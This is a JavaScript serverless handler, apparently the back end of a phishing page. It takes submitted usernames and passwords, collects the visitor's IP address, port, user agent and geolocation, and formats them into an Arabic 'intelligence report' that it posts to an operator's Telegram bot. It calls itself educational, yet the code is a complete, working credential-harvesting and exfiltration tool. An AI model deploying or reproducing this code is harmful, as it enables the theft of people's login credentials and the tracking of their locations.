const axios = require('axios');

export default async function handler(req, res) {
    if (req.method === 'POST') {
        const { username, password } = req.body;
        
        // استخراج البيانات التقنية
        const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
        const port = req.socket.remotePort;
        const userAgent = req.headers['user-agent'];
        
        // جلب الموقع الجغرافي
        const geoResponse = await axios.get(`https://ipapi.co/${ip}/json/`).catch(() => ({ data: {} }));
        const geo = geoResponse.data;

        // صياغة التقرير الاستخباري
        const report = `
🚨 **تقرير استخباري (نموذج تعليمي)** 🚨
👤 المستخدم: ${username}
🔑 كلمة السر: ${password}
-----------------------
🌐 **بصمة الاتصال:**
- الـ IP: ${ip}
- منفذ المصدر (Source Port): ${port}
- الجهاز: ${userAgent}
-----------------------
📍 **الموقع:** ${geo.city || 'Unknown'}, ${geo.country_name || 'Unknown'}
`;

        // إرسال التقرير لتليجرام
        // سنستخدم المتغيرات البيئية لاحقاً لحماية التوكن
        const botToken = process.env.BOT_TOKEN;
        const chatId = process.env.CHAT_ID;

        await axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            chat_id: chatId,
            text: report
        });

        return res.status(200).json({ status: 'Data Captured' });
    }
    return res.status(405).send('Method Not Allowed');
}
